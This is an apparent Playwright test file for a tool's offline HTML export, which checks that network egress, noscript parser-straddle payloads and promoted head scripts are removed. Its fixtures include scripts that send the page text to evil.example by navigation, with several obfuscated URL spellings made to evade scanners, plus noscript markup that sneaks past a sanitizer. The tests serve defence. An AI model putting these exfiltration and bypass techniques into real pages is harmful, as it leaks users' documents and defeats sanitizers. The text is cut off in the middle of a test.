    const noscriptHandlerTag = exportedHtml.match(/<button\b[^>]*id="noscriptHandlerProbe"[^>]*>/i);
    expect(noscriptHandlerTag && noscriptHandlerTag[0]).toBeTruthy();
    expect(noscriptHandlerTag[0]).not.toMatch(/\sonclick\s*=/i);
    // The CSS inside that same fallback body: a `<style>` block and a `style=` attribute a
    // scripting-disabled reader really does fetch. The strict validator reads both off the
    // fallback view, so the export has to scrub them for the gate and the exporter to agree
    // (CMH-OFFLINE-05); asserting it here is what keeps the gate from rejecting a file the
    // export just produced.
    expect(exportedHtml).not.toMatch(/noscript-imported\.css|noscript-bg\.png|noscript-inline\.png/i);
    const noscriptStyleTag = exportedHtml.match(/<style\b[^>]*id="noscriptStyleProbe"[^>]*>/i);
    expect(noscriptStyleTag && noscriptStyleTag[0]).toBeTruthy();
    const noscriptInlineStyleTag =
      exportedHtml.match(/<div\b[^>]*id="noscriptInlineStyleProbe"[^>]*>/i);
    expect(noscriptInlineStyleTag && noscriptInlineStyleTag[0]).toBeTruthy();
    // The strip NEUTRALIZES a network `url(...)` to `url("data:,")` rather than deleting the
    // declaration, so assert no NETWORK url remains - not that no `url(` does. The slash run after
    // the scheme is optional here for the same reason the gate stopped requiring it (#961): a
    // scheme-only `url(https:host/x.png)` resolves to the same host.
    expect(noscriptInlineStyleTag[0]).not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:\/*|\/\/)/i);
    expect(exportedHtml).not.toContain("evil.example");
    // An SVG PRESENTATION ATTRIBUTE carries a CSS declaration VALUE, so it is neutralized by the
    // same `_offlineCssNoNetwork` reading the `style=` strip uses (#1186) - the network reference
    // becomes `url("data:,")` rather than the attribute being deleted, and a LOCAL `url(#id)`
    // reference (which is how these attributes are almost always written) survives byte-identical.
    // The strict validator run below is the other half of the CMH-OFFLINE-04 pairing: the gate now
    // reports exactly this shape, so a strip that missed it would emit a file its own gate rejects.
    const presentationTag = exportedHtml.match(/<rect\b[^>]*id="presentationProbe"[^>]*>/i);
    expect(presentationTag && presentationTag[0]).toBeTruthy();
    expect(presentationTag[0]).not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:\/*|\/\/)/i);
    // Every attribute the strip claims to neutralize is asserted on a REAL exported file, not only
    // through the source-reading parity test: the network reference is replaced by the neutral
    // `url("data:,")` (serialized with the quotes escaped), so a value that had been DELETED
    // instead - or one the strip never reached - fails here rather than passing the weaker "no
    // evil.example anywhere" check above (round-2 panel).
    for (const attr of ["clip-path", "mask", "fill", "stroke", "filter", "marker-end", "cursor"]) {
      expect(presentationTag[0], attr).toMatch(new RegExp(`\\b${attr}="url\\(&quot;data:,&quot;\\)`, "i"));
    }
    // The `<noscript>` fallback view, where the two sides could most easily disagree: the strict
    // gate reads that markup off its egress index (a scripting-DISABLED reader really loads it),
    // and the export's `DOMParser` runs with scripting OFF too, so its selector reaches the same
    // element. A strip that missed it would emit a file its own `--strict` rejects.
    const noscriptPresentationTag =
      exportedHtml.match(/<rect\b[^>]*id="noscriptPresentationProbe"[^>]*>/i);
    expect(noscriptPresentationTag && noscriptPresentationTag[0]).toBeTruthy();
    expect(noscriptPresentationTag[0])
      .not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:\/*|\/\/)/i);
    const presentationKeepTag = exportedHtml.match(/<rect\b[^>]*id="presentationKeep"[^>]*>/i);
    expect(presentationKeepTag && presentationKeepTag[0]).toBeTruthy();
    expect(presentationKeepTag[0]).toMatch(/clip-path="url\(#localClip\)"/);
    expect(presentationKeepTag[0]).toMatch(/fill="#336699"/);
    // `<image src>` / `<image srcset>` (#1165). In HTML content tree construction RENAMES the tag to
    // `img`, so the `all("img")` pass reaches that one; inside `<svg>` the element keeps its own name
    // and only `all("image")` does. Both have to be cleared, because the shared egress index the
    // strict validator reads deliberately does not carry the namespace its parser computes, so it
    // reports `<image src>` in either - a strip that left the SVG spelling behind would have the
    // gate reject the file this export just made. The relative control must SURVIVE, in both of the
    // attributes it carries.
    expect(attrOfId(exportedHtml, "svgImageSrc", "src")).toBeUndefined();
    expect(attrOfId(exportedHtml, "svgImageSrcset", "srcset")).toBeUndefined();
    expect(attrOfId(exportedHtml, "svgImageKeep", "href")).toBe("local-vector.png");
    expect(attrOfId(exportedHtml, "svgImageKeep", "src")).toBe("local-image-src.png");
    expect(attrOfId(exportedHtml, "htmlImageSrc", "src")).toBe("data:image/gif;base64,R0lGODlhAQABAAAAACw=");
    expect(attrOfId(exportedHtml, "htmlImageSrcset", "srcset")).toBeUndefined();
    expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
    expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
    expect(exportedHtml).not.toMatch(/<meta\b[^>]*http-equiv=["']refresh/i);
    expect(exportedHtml).not.toMatch(/@import\s/i);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-zero.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// A `<noscript>` body has TWO readings, and the export re-parses with only one of them. To the
// `DOMParser` (scripting off) the body is MARKUP, which is what every strip walks; to the reviewer
// who opens the exported file (scripting on) it is RAW TEXT that ends at the first `</noscript`.
// The two therefore disagree whenever the SERIALIZED body still carries a `</noscript` end-tag-open,
// and what follows that seam is markup the strips never saw. Measured in chromium, two shapes really
// do survive an unguarded export as a LIVE handler - a comment and a raw-text `<style>` child, both
// of which the serializer writes out verbatim. (An attribute value no longer can: the serializer now
// escapes `<` and `>` inside one.) The strict validator already fails closed on exactly this seam, so
// an export that emits one produces a file its own gate rejects, which is the self-contradiction the
// offline parity work exists to remove.
const NOSCRIPT_STRADDLE_CONTENT = `
<h1>Noscript straddle</h1>
<p id="straddle-note">A fallback body the two tokenizers end differently must not ride into an offline export.</p>
<noscript><!-- cmh-noscript-comment-straddle </noscript><img id="commentStraddleProbe" alt="comment straddle" src="data:image/gif;base64,AA" onload="window.__cmhStraddle = 'comment'"> --></noscript>
<noscript><style id="noscriptStraddleStyle">/* cmh-noscript-style-straddle </noscript><img id="styleStraddleProbe" alt="style straddle" src="data:image/gif;base64,AA" onload="window.__cmhStraddle = 'style'"> */</style></noscript>
<noscript><p id="plainFallbackProbe">cmh-noscript-plain-keep: enable JavaScript to review this document.</p></noscript>
<!-- A fallback SCRIPT: a real element to the scripting-disabled DOMParser, inert TEXT to the reader
     who opens the file. The chart hoist moves a Chart-mentioning script into the body so it runs
     after the inlined library - which, for one parked here, would not relocate author code but
     START it. -->
<noscript><script>window.__cmhNoscriptHoisted = 1; new Chart(document.body, {});/* cmh-noscript-hoist-probe */</script></noscript>
<!-- A FOREIGN noscript is an ordinary SVG element: it switches no tokenizer on either side, so
     both readings agree about it even when its body spells the seam, and it must survive. -->
<svg width="10" height="10" aria-label="foreign fallback"><noscript id="svgFallbackProbe"><!-- cmh-svg-noscript-keep </noscript> --></noscript></svg>`;

test("CMH-OFFLINE-05: a noscript body the two tokenizers end differently is dropped, and an ordinary fallback is not", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageContent(NOSCRIPT_STRADDLE_CONTENT, { key: "cmh-offline-noscript-straddle", source: "offline-noscript-straddle.html" });
  // Served over HTTP so the export reads the AUTHORED bytes off disk (the `file://` fallback is the
  // live-DOM snapshot, where the scripting-enabled reading has already been baked in).
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // The unresolvable bodies go whole: what sits past the seam is markup no strip ever saw, so
    // there is nothing to scrub it with and nothing that could certify it.
    expect(exportedHtml, "a comment-straddled fallback must not survive").not.toContain("cmh-noscript-comment-straddle");
    expect(exportedHtml, "a style-straddled fallback must not survive").not.toContain("cmh-noscript-style-straddle");
    expect(exportedHtml, "the straddled handler must not survive").not.toContain("__cmhStraddle");
    // ... and ONLY those. An ordinary fallback reads the same both ways (inert text to one reader,
    // already-scrubbed markup to the other), so removing it would be unrequested content loss - the
    // layer's own print fallback included.
    expect(exportedHtml, "an ordinary fallback is not a straddle").toContain("cmh-noscript-plain-keep");
    expect(exportedHtml, "the layer's own print fallback must survive").toContain("cmhPrintNoScript");
    // A foreign `<noscript>` is an ordinary SVG element - no tokenizer switches on either side - so
    // it is not a straddle however its body reads, and removing it would be pure content loss.
    expect(exportedHtml, "a foreign noscript is not a straddle").toContain("cmh-svg-noscript-keep");
    // Nor may the export ACTIVATE fallback content. A script parked in a fallback is inert text to
    // the reader, and the chart hoist would otherwise move it into the body, where it runs.
    const hoistProbe = exportedHtml.indexOf("cmh-noscript-hoist-probe");
    expect(hoistProbe, "the fallback script must still be in the file").toBeGreaterThan(0);
    const fallbackStart = exportedHtml.lastIndexOf("<noscript>", hoistProbe);
    const fallbackEnd = exportedHtml.indexOf("</noscript>", fallbackStart);
    expect(fallbackEnd, "the fallback script must still be INSIDE its noscript").toBeGreaterThan(hoistProbe);
    // Removing author content is named rather than silent, exactly as a dropped script is.
    await expect(page.locator("#toast")).toContainText("2 noscript fallback blocks");

    const exportedPath = path.join(outDir, "offline-noscript-straddle.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: the exporter cannot ship a file its own --strict rejects.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
    // ...and the other direction, which the clean file alone cannot prove: put a straddling body
    // BACK into the exported file and the gate must reject it, so what the strip removes is really
    // what the gate refuses to certify rather than a shape it never looked at.
    const reinjectedPath = path.join(outDir, "offline-noscript-straddle-reinjected.html");
    // The LAST `</body>`: the layer's own script text mentions the string, and replacing the first
    // occurrence would bury the fallback inside a script body, where it is inert text and proves
    // nothing.
    const bodyEnd = exportedHtml.lastIndexOf("</body>");
    expect(bodyEnd, "the exported file must have a body end tag").toBeGreaterThan(0);
    const reinjectedHtml = exportedHtml.slice(0, bodyEnd)
      + "<noscript><!-- </noscript><img alt=\"reinjected\" src=\"data:image/gif;base64,AA\" onload=\"window.__cmhStraddle = 1\"> --></noscript>"
      + exportedHtml.slice(bodyEnd);
    expect(reinjectedHtml, "the fallback must actually have been re-injected").not.toEqual(exportedHtml);
    fs.writeFileSync(reinjectedPath, reinjectedHtml);
    // Pinned to the PARSE-FAILURE rule, not merely to a non-zero exit: an exit-code-only assertion
    // would be satisfied by any future rule that rejected this file for an unrelated reason.
    let reinjectedFailure = null;
    try {
      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
    } catch (err) {
      reinjectedFailure = String(err.stdout || "") + String(err.stderr || "");
    }
    expect(reinjectedFailure, "--strict must reject a re-injected straddling fallback").not.toBeNull();
    expect(reinjectedFailure).toContain("could not parse the document for the self-contained resource checks");

    // The reading that matters is the reviewer's: open the exported file in a REAL browser, where
    // scripting is on and a straddled `<img onload>` would be a live element rather than text.
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    expect(await page2.locator("#commentStraddleProbe").count()).toBe(0);
    expect(await page2.locator("#styleStraddleProbe").count()).toBe(0);
    expect(await page2.evaluate(() => window.__cmhStraddle)).toBeUndefined();
    // The fallback script must NOT have run: it was inert text in the source document and the export
    // may not turn it into live code.
    expect(await page2.evaluate(() => window.__cmhNoscriptHoisted)).toBeUndefined();
    expect(external).toEqual([]);

    // Shareable makes no zero-network promise and preserves the author's bytes by design, so it is
    // unaffected in BOTH directions: the ordinary fallback and the straddling ones all travel.
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnSaveHtmlTop").click(),
    ]);
    const shareableHtml = await capturedDownloadText(page);
    expect(shareableHtml, "Shareable keeps an ordinary fallback").toContain("cmh-noscript-plain-keep");
    expect(shareableHtml, "Shareable does not rewrite author bytes").toContain("cmh-noscript-comment-straddle");
    expect(shareableHtml, "Shareable does not rewrite author bytes").toContain("cmh-noscript-style-straddle");
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// A `<noscript>` in the HEAD is the shape the strip above cannot reach, because there the fallback
// is not an ordinary element to the scripting-DISABLED parse at all. The "in head noscript"
// insertion mode allows only `link`, `style`, `meta`, `basefont`, `bgsound`, `noframes`, comments
// and whitespace; anything else POPS the fallback and reprocesses that node - and everything after
// it - as a head SIBLING. Measured in chromium: the source `<head><noscript><script>...` parses to
// `<noscript></noscript><script>...`, so the export ACTIVATES code the source document never ran
// (with scripting ON a head fallback is inert raw text). It happens INSIDE `DOMParser`, before any
// pass can see it, and a promoted node is indistinguishable from an authored sibling - so the fix
// is a PRE-PARSE pass over the source string and this test pins both directions of it.
const HEAD_NOSCRIPT_CONTENT = `
<h1>Head fallback</h1>
<p id="head-fallback-note">A head fallback a scripting-disabled parse takes apart must not ride into an offline export as live head content.</p>
<div class="cmh-checklist" data-cmh-checklist="head-fallback" data-cmh-checklist-label="Pending state">
  <ul>
    <li data-cmh-item="pending" data-cmh-state="blank">Something to change before exporting</li>
  </ul>
</div>`;
const HEAD_NOSCRIPT_PROMOTED =
  '<noscript id="headPromotedFallback"><script>window.__cmhHeadFallback = 1;/* cmh-head-noscript-promote */</script></noscript>';
// The control: only what the insertion mode allows, so a scripting-disabled parse promotes nothing
// and the fallback is ordinary content. It proves the fix is not a blanket head-fallback removal.
const HEAD_NOSCRIPT_KEPT =
  '<noscript id="headKeptFallback"><!-- cmh-head-noscript-keep --><meta name="cmh-head-fallback" content="kept">'
  + "<style>#headKeptFallback { color: #333; }</style></noscript>";

function stageWithHead(contentHtml, headHtml, opts) {
  const staged = stageContent(contentHtml, opts);
  const html = fs.readFileSync(staged.html, "utf8");
  const headEnd = html.indexOf("</head>");
  if (headEnd < 0) throw new Error("no </head> in the staged document");
  fs.writeFileSync(staged.html, html.slice(0, headEnd) + headHtml + "\n" + html.slice(headEnd));
  return staged;
}

test("CMH-OFFLINE-05: a head noscript body the scripting-disabled parse promotes out is dropped, not activated", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageWithHead(HEAD_NOSCRIPT_CONTENT, HEAD_NOSCRIPT_PROMOTED + "\n" + HEAD_NOSCRIPT_KEPT,
    { key: "cmh-offline-head-noscript", source: "offline-head-noscript.html" });
  // Served over HTTP so the export reads the AUTHORED bytes off disk: the `file://` fallback is a
  // live-DOM snapshot, in which the promotion has not happened and there is nothing to strip.
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    // The reading that the export must not change: in the SOURCE document, with scripting on, the
    // head fallback is inert raw text and its script never runs.
    expect(await page.evaluate(() => window.__cmhHeadFallback),
      "the source document must not run its head fallback").toBeUndefined();
    // Leave PENDING STATE before exporting. Every state applier (checklist here, and equally the
    // widget, note and review ones) round-trips the document through `DOMParser` when it has
    // something to write, and that parse promotes a head fallback exactly as the export's own does
    // - so the fallback has to be judged on the authored bytes, before any of them run. Without
    // that ordering this whole rule is bypassed by the ordinary case of a reviewed document.
    await page.locator('[data-cmh-item="pending"] .cmh-check').first().click();
    await expect(page.locator('[data-cmh-item="pending"] .cmh-check').first())
      .toHaveAttribute("data-cmh-check-state", "check");
    // Pending state opens the review panel, so the export runs from the sidebar menu here.
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // The promoted body goes WHOLE: once the parse has taken it apart there is nothing left in the
    // DOM that says it was ever fallback content.
    expect(exportedHtml, "a promoted head fallback must not survive").not.toContain("cmh-head-noscript-promote");
    expect(exportedHtml, "the promoted script must not survive").not.toContain("__cmhHeadFallback");
    // ... and ONLY that. A head fallback the insertion mode accepts is content both readings agree
    // about, so removing it would be unrequested content loss.
    expect(exportedHtml, "an allowed head fallback is not a promotion").toContain("cmh-head-noscript-keep");
    expect(exportedHtml, "the allowed fallback keeps its body").toContain('content="kept"');
    expect(exportedHtml, "the layer's own print fallback must survive").toContain("cmhPrintNoScript");
    // Removing author content is named rather than silent, exactly as a straddling fallback is.
    await expect(page.locator("#toast")).toContainText("1 noscript fallback block in the document head");

    const exportedPath = path.join(outDir, "offline-head-noscript.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: the exporter cannot ship a file its own --strict rejects.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
    // ...and the other direction, which the clean file alone cannot prove: put a promoting fallback
    // BACK into the exported file's head and the gate must reject it, so what the strip removes is
    // really what the gate refuses to certify rather than a shape it never looked at.
    const reinjectedPath = path.join(outDir, "offline-head-noscript-reinjected.html");
    const headEnd = exportedHtml.indexOf("</head>");
    expect(headEnd, "the exported file must have a head end tag").toBeGreaterThan(0);
    const reinjectedHtml = exportedHtml.slice(0, headEnd) + HEAD_NOSCRIPT_PROMOTED + exportedHtml.slice(headEnd);
    fs.writeFileSync(reinjectedPath, reinjectedHtml);
    let reinjectedFailure = null;
    try {
      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
    } catch (err) {
      reinjectedFailure = String(err.stdout || "") + String(err.stderr || "");
    }
    expect(reinjectedFailure, "--strict must reject a re-injected promoting head fallback").not.toBeNull();
    // Pinned to the RULE, not merely to a non-zero exit: an exit-code-only assertion would be
    // satisfied by any future rule that rejected this file for an unrelated reason.
    expect(reinjectedFailure).toContain("in head noscript");

    // The reading that matters is the reviewer's: open the exported file in a REAL browser, where
    // scripting is on and a promoted script would be live code rather than text.
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    expect(await page2.evaluate(() => window.__cmhHeadFallback),
      "the export must not run what the source left inert").toBeUndefined();
    // The kept fallback is still a FALLBACK: with scripting on its body is raw text, so its meta is
    // prose rather than an element the document head declares.
    expect(await page2.locator("#headKeptFallback").count()).toBe(1);
    expect(await page2.evaluate(() => document.querySelectorAll('meta[name="cmh-head-fallback"]').length),
      "an allowed fallback body stays inert text, not promoted head content").toBe(0);
    expect(external).toEqual([]);

    // Shareable makes no zero-network promise and preserves the author's bytes by design, so it is
    // unaffected in BOTH directions.
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.locator('[data-cmh-item="pending"] .cmh-check').first().click();
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnSaveHtml"),
    ]);
    const shareableHtml = await capturedDownloadText(page);
    expect(shareableHtml, "Shareable does not rewrite author bytes").toContain("cmh-head-noscript-promote");
    expect(shareableHtml, "Shareable keeps an allowed head fallback").toContain("cmh-head-noscript-keep");
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline neutralizes form posts and preserves safe canvas scripts (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_FORMS_AND_CANVAS = `
<h1>Offline forms and canvas</h1>
<p id="form-canvas-note">Network form targets must not survive offline export.</p>
<form id="remoteForm" action="https://evil.example/post">
  <button id="remoteButton" formaction="//evil.example/button">Send</button>
  <input id="remoteInput" formaction="https://evil.example/input" value="Send">
</form>
<div class="cm-skip"><canvas id="customCanvas" width="20" height="20" role="img" aria-label="Custom canvas"></canvas></div>
<script>
(function () {
  window.__benignImportCommentKept = true;
  if (false) import("./local-module.js");
  // This comment has slashes but no network dynamic import.
})();
</script>
<script>
(function () {
  var canvas = document.getElementById("customCanvas");
  var ctx = canvas && canvas.getContext("2d");
  if (!ctx) return;
  ctx.fillStyle = "#ff0000";
  ctx.fillRect(0, 0, 20, 20);
  window.__customCanvasDrew = true;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_FORMS_AND_CANVAS, { key: "cmh-offline-forms-canvas", source: "offline-forms-canvas.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    expect(exportedHtml).toContain("window.__benignImportCommentKept = true");
    expect(exportedHtml).toContain("window.__customCanvasDrew = true");
    for (const id of ["remoteForm", "remoteButton", "remoteInput"]) {
      const tag = exportedHtml.match(new RegExp(`<[^>]+id=["']${id}["'][^>]*>`, "i"));
      expect(tag && tag[0]).toBeTruthy();
      expect(tag[0]).not.toMatch(/\s(?:action|formaction)\s*=/i);
    }

    const exportedPath = path.join(outDir, "offline-forms-canvas.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => ({
      importCommentKept: window.__benignImportCommentKept === true,
      customCanvasDrew: window.__customCanvasDrew === true,
      pixel: Array.from(document.getElementById("customCanvas").getContext("2d").getImageData(1, 1, 1, 1).data),
    }));
    expect(state.importCommentKept).toBe(true);
    expect(state.customCanvasDrew).toBe(true);
    expect(state.pixel.slice(0, 3)).toEqual([255, 0, 0]);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("a preserved inline script cannot beacon by navigating the offline file to a remote URL (CMH-OFFLINE-05)", async ({ page, browser }) => {
  // Each smuggled URL spelling is proved against the REAL `validate.py --strict` CLI, and every one
  // of those runs parses a multi-megabyte exported document in a fresh Python subprocess, so the
  // default 30s budget is not enough once the URL literal covers five spellings.
  test.setTimeout(90000);
  // The zero-network CSP blocks every SUBRESOURCE channel but cannot restrict TOP-LEVEL
  // NAVIGATION: `navigate-to` was dropped from CSP Level 3 and ships in no browser, and
  // `sandbox` is ignored when the policy arrives in a <meta>. So a script the export
  // deliberately preserves (CMH-OFFLINE-04) could exfiltrate the whole document - every
  // reviewer comment included - simply by assigning `location.href`. The exporter therefore
  // strips a direct scripted navigation to a network URL the same way it strips a remote
  // dynamic import. The beacon is armed only under `file:` so the SOURCE document, which the
  // exporter reads over http, is not the thing that navigates away.
  const CONTENT_WITH_NAVIGATION = `
<h1>Offline navigation egress</h1>
<p id="nav-note">A preserved inline script must not be able to beacon by navigating away.</p>
<meta name="referrer" content="unsafe-url">
<meta http-equiv="Referrer-Policy" content="unsafe-url">
<template id="parkedReferrer"><meta name="referrer" content="unsafe-url"><meta http-equiv="Referrer-Policy" content="unsafe-url"><a href="local.html" referrerpolicy="unsafe-url">parked</a></template>
<noscript><meta name="referrer" content="unsafe-url"><a href="local.html" referrerpolicy="unsafe-url">fallback</a></noscript>
<a id="docsLink" href="https://docs.example.org/guide" referrerpolicy="unsafe-url">Docs</a>
<script>
(function () {
  window.__cmhExfilRan = true;
  if (location.protocol === "file:") {
    location.href = "https://evil.example/steal?data=" + encodeURIComponent(document.body.innerText);
  }
})();
</script>
<script>
(function () {
  window.__cmhOpenExfilRan = true;
  if (location.protocol === "file:") window.open("https://evil.example/popup");
})();
</script>
<script>
(function () {
  // A prefix CHAIN used to clear the strip - typing "window." in front of the sink is not a
  // meaningful obstacle, so the pattern must follow the whole chain.
  window.__cmhChainExfilRan = true;
  if (location.protocol === "file:") window.top.location.href = "https://evil.example/chain";
})();
</script>
<script>
(function () {
  // A URL literal spelled WITHOUT the slashes after the scheme. A browser resolves
  // "https:evil.example/x" to "https://evil.example/x", so this beacons exactly as well as the
  // direct assignment above while needing no aliasing, no computed access and no obfuscation.
  window.__cmhSchemeOnlyExfilRan = true;
  if (location.protocol === "file:") location.href = "https:evil.example/scheme-only";
})();
</script>
<script>
(function () {
  // A URL the BROWSER NORMALIZES before it resolves it. The leading space is stripped by the URL
  // parser, so this reaches the same host as the unpadded spelling - one keystroke past a scan
  // that reads the literal raw.
  window.__cmhPaddedExfilRan = true;
  if (location.protocol === "file:") location.href = " https://evil.example/padded";
})();
</script>
<script>
(function () {
  // An ASCII tab INSIDE the scheme. The URL parser removes tab, LF and CR from anywhere in its
  // input, and a real tab is legal inside an ordinary string literal.
  window.__cmhTabExfilRan = true;
  if (location.protocol === "file:") window.location.href = "ht\ttps://evil.example/tab";
})();
</script>
<script>
(function () {
  // A real BACKSLASH where a slash is expected: for a special scheme the URL parser treats the two
  // alike, so this schemeless authority resolves exactly like "//evil.example". Written with four
  // source backslashes because a JS string literal needs two per runtime backslash.
  window.__cmhBackslashExfilRan = true;
  if (location.protocol === "file:") location.replace("\\\\\\\\evil.example/back");
})();
</script>
<script>
(function () {
  // The other half of the same shape: an ESCAPED slash, which the JS string literal turns back into
  // a plain slash the URL parser reads as an authority slash.
  window.__cmhEscapedSlashExfilRan = true;
  if (location.protocol === "file:") location.href = "\\//evil.example/escaped";
})();
</script>
<script>
(function () {
  // A JavaScript LineContinuation - a backslash followed by a real line terminator - evaluates to
  // NOTHING, so the literal below IS the bare network URL. Unlike a character escape it needs no
  // decoding to see, which is why it is closed rather than left in the residual.
  window.__cmhContinuationExfilRan = true;
  if (location.protocol === "file:") location.href = "\\
https://evil.example/continued";
})();
</script>
<script>
(function () {
  // Control: a padded network URL that is only ever DISPLAYED, and a navigation to a LOCAL
  // fragment that merely starts with the same padding. Tolerating the characters a browser
  // normalizes away must not start deleting these.
  window.__cmhPaddedStringKept = "  https://docs.example.org/guide";
  if (location.hash === "#docs") location.href = " #docs-section";
})();
</script>
<script>
(function () {
  // Control: a bare "https:" scheme string and a COMPARISON against a scheme-only URL. Widening
  // the URL literal to catch the beacon above must not start deleting these.
  window.__cmhSchemeStringKept = "https:";
  if (location.href === "https:api.example.org/v1") document.title = "same";
})();
</script>
<script>
(function () {
  // Control: mentions both a navigation object and a network URL literal, but never
  // navigates to one. A strip that deleted this would break benign authored documents.
  window.__cmhBenignLocationKept = true;
  var DOCS_URL = "https://docs.example.org/guide";
  if (location.hash === "#docs" && location.href !== DOCS_URL) document.title = "docs";
})();
</script>
<script>
(function () {
  // Control: a LOCAL binding that merely happens to be named "location", and a local helper
  // named "open". Neither navigates anything, and deleting the whole script over them would
  // silently break an ordinary authored document - the costlier failure direction.
  var location = "https://api.example.org/v1";
  var open = function (u) { window.__cmhLocalOpenArg = u; };
  open("https://docs.example.org/guide");
  window.__cmhLocalShadowKept = location;
})();
</script>
<script>
(function () {
  // Control: a shadowed location OBJECT whose href is then assigned. This is the shape the
  // sink pattern matches literally, yet it navigates nothing - only the local object changes.
  var location = { href: "" };
  location.href = "https://api.example.org/v1";
  window.__cmhShadowedHrefKept = location.href;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_NAVIGATION, { key: "cmh-offline-navigation", source: "offline-navigation.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("evil.example");
    expect(exportedHtml).toContain("window.__cmhBenignLocationKept = true");
    expect(exportedHtml).toContain('window.__cmhSchemeStringKept = "https:"');
    expect(exportedHtml).toContain("window.__cmhPaddedStringKept =");
